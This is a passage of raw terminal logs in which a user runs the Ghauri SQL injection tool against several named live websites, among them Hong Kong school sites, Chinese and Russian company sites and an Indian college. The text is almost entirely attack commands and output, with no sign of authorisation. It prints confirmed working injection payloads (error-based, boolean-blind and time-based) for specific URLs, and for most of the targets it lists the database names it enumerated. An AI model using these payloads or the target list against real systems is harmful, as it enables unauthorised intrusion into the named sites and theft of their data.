+[02:31:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:31:42] [INFO] testing 'MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:32:05] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)'
+[02:32:16] [INFO] testing 'MySQL >= 5.1 error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (PROCEDURE ANALYSE)'
+[02:32:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:32:42] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)'
+[02:32:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:33:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[02:33:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[02:34:32] [INFO] testing 'Boolean-based blind - Parameter replace'
+[02:34:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[02:34:50] [INFO] testing 'boolean-based blind - WHERE or HAVING clause (CASE STATEMENT)'
+[02:35:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[02:35:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[02:35:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[02:35:59] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[02:36:01] [INFO] testing 'MySQL boolean-based blind - (IF STATEMENT)'
+[02:36:14] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[02:36:22] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (query SLEEP)' injectable
+[02:36:22] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 455 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (query SLEEP)
+    Payload: id=421"XOR(SELECT(0)FROM(SELECT(SLEEP(6)))a)XOR"Z
+---
+[02:37:03] [INFO] testing MySQL
+[02:37:03] [INFO] confirming MySQL
+[02:37:03] [INFO] the back-end DBMS is MySQL
+[02:37:03] [INFO] fetching database names
+[02:37:03] [INFO] fetching number of databases
+[02:37:41] [INFO] retrieved: 2 
+[02:42:33] [WARNING] invalid character detected, retrying.
+[02:47:00] [INFO] retrieved: information_schema 
+[02:55:10] [INFO] retrieved: srv179119_db21016m 
+available databases [2]:
+[*] srv179119_db21016m
+[*] information_schema
+
+[02:55:10] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.variant-billiard.ru'
+
+[*] ending @ 02:55:10 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://qc.edu.hk/publications.php?id=11&time=0&page=0' --dbs                 
+dquote> 
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://qc.edu.hk/publications.php?id=11&time=0&page=0" --dbs
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:28:00 /2025-11-29/
+
+[02:28:00] [INFO] testing connection to the target URL
+[02:28:00] [INFO] testing if the target URL content is stable
+[02:28:01] [INFO] target URL content is stable
+[02:28:02] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[02:28:02] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[02:28:08] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[02:28:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[02:28:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[02:28:43] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[02:28:54] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[02:29:05] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[02:29:15] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[02:29:26] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[02:29:39] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[02:29:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[02:30:01] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[02:30:01] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[02:30:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:30:03] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="二零二一年二月")
+[02:30:03] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[02:30:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[02:30:16] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[02:30:33] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 124 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=11 AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- wXyW&time=0&page=0
+
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=11 AND 06113=6113-- wXyW&time=0&page=0
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=if(now()=sysdate(),SLEEP(7),0)&time=0&page=0
+---
+[02:37:15] [INFO] testing MySQL
+[02:37:15] [INFO] confirming MySQL
+[02:37:15] [INFO] the back-end DBMS is MySQL
+[02:37:15] [INFO] fetching database names
+[02:37:15] [INFO] fetching number of databases
+[02:37:16] [INFO] retrieved: 4
+[02:37:19] [INFO] retrieved: information_schema
+[02:37:20] [INFO] retrieved: queens
+[02:37:22] [INFO] retrieved: test
+[02:37:24] [INFO] retrieved: test_demo
+available databases [4]:
+[*] test
+[*] queens
+[*] test_demo
+[*] information_schema
+
+[02:37:24] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/qc.edu.hk'
+
+[*] ending @ 02:37:24 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "http://www.jm-chem.com.cn/news_show.php?id=190" --dbs                         
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:28:19 /2025-11-29/
+
+[02:28:19] [INFO] testing connection to the target URL
+[02:28:20] [INFO] testing if the target URL content is stable
+[02:28:21] [INFO] target URL content is stable
+[02:28:21] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[02:28:21] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[02:28:24] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[02:28:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[02:28:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[02:28:38] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[02:28:43] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[02:28:48] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[02:28:53] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[02:28:57] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[02:29:02] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[02:29:07] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[02:29:11] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[02:29:16] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)'
+[02:29:21] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:29:26] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:29:34] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:29:40] [INFO] testing 'MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:29:46] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)'
+[02:29:52] [INFO] testing 'MySQL >= 5.1 error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (PROCEDURE ANALYSE)'
+[02:29:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:30:02] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)'
+[02:30:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:30:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[02:30:25] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable
+[02:30:25] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[02:30:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[02:30:30] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[02:30:40] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+[02:30:40] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 285 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: id=190 OR NOT 05850=5850
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=if(now()=sysdate(),SLEEP(9),0)
+---
+[02:37:22] [INFO] testing MySQL
+[02:37:22] [INFO] confirming MySQL
+[02:37:22] [INFO] the back-end DBMS is MySQL
+[02:37:22] [INFO] fetching database names
+[02:37:22] [INFO] fetching number of databases
+[02:37:30] [INFO] retrieved: 2 
+[02:38:52] [INFO] retrieved: information_schema 
+[02:39:47] [INFO] retrieved: my5775547753 
+available databases [2]:
+[*] information_schema
+[*] my5775547753
+
+[02:39:47] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.jm-chem.com.cn'
+
+[*] ending @ 02:39:47 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://skhsjtst.edu.hk/albums.php?id=5&time=2022-2023&page=0" --dbs          
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:30:43 /2025-11-29/
+
+[02:30:45] [INFO] testing connection to the target URL
+[02:30:47] [INFO] testing if the target URL content is stable
+[02:30:49] [INFO] target URL content is stable
+[02:30:51] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[02:30:51] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[02:30:54] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[02:31:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[02:31:39] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[02:32:02] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[02:32:24] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[02:32:47] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[02:33:12] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[02:33:34] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[02:33:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[02:34:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[02:34:43] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[02:34:45] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[02:34:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:34:51] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="29")
+[02:34:51] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[02:34:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[02:35:11] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[02:36:14] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[02:36:32] [INFO] testing 'MySQL >= 5.0.12 time-based blind (CASE STATEMENT)'
+[02:37:07] [WARNING] in case of read timeout performing further tests to confirm if the detected payload is working..
+[02:38:16] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (CASE STATEMENT)' injectable (with error ReadTimeout on --timeout=30)
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 124 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=5 AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- wXyW&time=2022-2023&page=0
+
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=5 AND 05239=5239-- wXyW&time=2022-2023&page=0
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (CASE STATEMENT)
+    Payload: id=(SELECT CASE WHEN(1234=1234) THEN SLEEP(8) ELSE 0 END)&time=2022-2023&page=0
+---
+[02:38:19] [INFO] testing MySQL
+[02:38:19] [INFO] confirming MySQL
+[02:38:19] [INFO] the back-end DBMS is MySQL
+[02:38:19] [INFO] fetching database names
+[02:38:19] [INFO] fetching number of databases
+[02:38:21] [INFO] retrieved: 4
+[02:38:27] [INFO] retrieved: information_schema
+[02:38:29] [INFO] retrieved: stjohn
+[02:38:32] [INFO] retrieved: test
+[02:38:35] [INFO] retrieved: test_demo
+available databases [4]:
+[*] test_demo
+[*] test
+[*] information_schema
+[*] stjohn
+
+[02:38:35] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/skhsjtst.edu.hk'
+
+[*] ending @ 02:38:35 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ ghauri -u "http://bjrtcw.cn/cp_show.php?id=" --dbs                                       
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:31:19 /2025-11-29/
+
+[02:31:19] [INFO] testing connection to the target URL
+[02:31:21] [INFO] testing if the target URL content is stable
+[02:31:22] [INFO] target URL content is stable
+[02:31:24] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[02:31:24] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[02:36:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[02:36:16] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[02:36:32] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[02:36:53] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[02:37:10] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[02:37:25] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[02:37:41] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[02:37:58] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[02:38:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[02:38:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[02:39:00] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[02:39:16] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)'
+[02:39:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:39:31] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' injectable
+[02:39:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:39:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[02:39:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[02:39:40] [INFO] testing 'Boolean-based blind - Parameter replace'
+[02:39:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[02:40:01] [INFO] testing 'boolean-based blind - WHERE or HAVING clause (CASE STATEMENT)'
+[02:40:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[02:40:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[02:40:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[02:40:18] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[02:40:20] [INFO] testing 'MySQL boolean-based blind - (IF STATEMENT)'
+[02:40:22] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[02:40:23] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[02:40:35] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[02:40:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[02:41:03] [INFO] testing 'MySQL >= 5.0.12 time-based blind (CASE STATEMENT)'
+[02:41:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - CASE STATEMENT)'
+[02:41:30] [INFO] testing 'MySQL >= 5.0.12 time-based blind (SLEEP)'
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 148 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)
+    Payload: id=UPDATEXML(0,CONCAT(0x7e,0x72306f746833783439,0x7e),0)
+---
+[02:41:56] [INFO] testing MySQL
+[02:41:56] [INFO] confirming MySQL
+[02:41:56] [INFO] the back-end DBMS is MySQL
+[02:41:56] [INFO] fetching database names
+[02:41:56] [INFO] fetching number of databases
+[02:42:00] [WARNING] the SQL query provided does not return any output
+[02:42:00] [ERROR] unable to retrieve the number of databases
+[02:42:00] [INFO] fetching current database
+[02:42:02] [INFO] retrieved: 'bjrtcw91'
+current database: 'bjrtcw91'
+
+[02:42:02] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/bjrtcw.cn'
+
+[*] ending @ 02:42:02 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ 
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ ghauri -u "http://testhistory.ru/history.php?id=his_3_132999999.9%27" --dbs              
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:31:45 /2025-11-29/
+
+[02:31:45] [INFO] testing connection to the target URL
+[02:31:46] [INFO] testing if the target URL content is stable
+[02:31:47] [INFO] target URL content is stable
+[02:31:47] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[02:31:47] [INFO] testing for SQL injection on GET parameter 'id'
+[02:31:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:32:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[02:32:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[02:32:24] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="IV")
+[02:32:26] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+[02:35:56] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[02:35:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[02:36:01] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[02:36:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[02:36:11] [INFO] testing 'MySQL >= 5.0.12 time-based blind (CASE STATEMENT)'
+[02:36:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - CASE STATEMENT)'
+[02:36:22] [INFO] testing 'MySQL >= 5.0.12 time-based blind (SLEEP)'
+[02:36:26] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[02:36:26] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:36:26] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:36:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:36:27] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 77 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)
+    Payload: id=his_3_132999999.9' AND UPDATEXML(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e),0)-- wXyW
+
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: id=his_3_132999999.9' OR 09549=9549-- wXyW
+---
+[02:37:48] [INFO] testing MySQL
+[02:37:48] [INFO] confirming MySQL
+[02:37:48] [INFO] the back-end DBMS is MySQL
+[02:37:48] [INFO] fetching database names
+[02:37:48] [INFO] fetching number of databases
+[02:37:49] [INFO] retrieved: 5
+[02:37:50] [INFO] retrieved: information_schema
+[02:37:53] [INFO] retrieved: srv65015_219
+[02:37:55] [INFO] retrieved: srv65015_pdd
+[02:37:57] [INFO] retrieved: srv65015_tests
+[02:37:58] [INFO] retrieved: srv65015_tforum
+available databases [5]:
+[*] information_schema
+[*] srv65015_219
+[*] srv65015_tests
+[*] srv65015_pdd
+[*] srv65015_tforum
+
+[02:37:58] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/testhistory.ru'
+
+[*] ending @ 02:37:58 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ 
+
+
+
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ ghauri -u "https://purbanchalcollege.ac.in/dept/profile.php?id=151" --dbs
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 03:53:47 /2025-11-29/
+
+[03:53:48] [INFO] testing connection to the target URL
+[03:53:52] [INFO] testing if the target URL content is stable
